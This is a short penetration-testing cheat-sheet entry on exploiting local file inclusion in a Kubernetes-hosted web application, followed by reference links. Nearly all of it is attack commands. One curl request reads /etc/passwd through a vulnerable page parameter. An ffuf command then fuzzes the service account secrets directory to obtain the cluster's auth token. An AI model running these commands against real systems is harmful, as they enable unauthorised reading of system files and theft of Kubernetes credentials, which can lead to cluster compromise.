## Kubernetes Local File Inclusion (LFI) to Exploit:
```
# Basic LFI
  curl -s http://0.0.0.0/file.php?page=/etc/passwd
# If LFI, also check
  /var/run/secrets/kubernetes.io/serviceaccount
# Ffuf
  ffuf -u http://0.0.0.0/file.php?page=/var/run/secrets/kubernetes.io/serviceaccount/FUZZ -w /usr/share/seclists/Discovery/Web-Content/Big.txt -fw 1126
  
You will get AuthToken
```
### References:
1. https://pentestbook.six2dez.com/enumeration/web/lfi-rfi
2. https://www.youtube.com/watch?v=Vj4PvvtCA1c
3. https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3
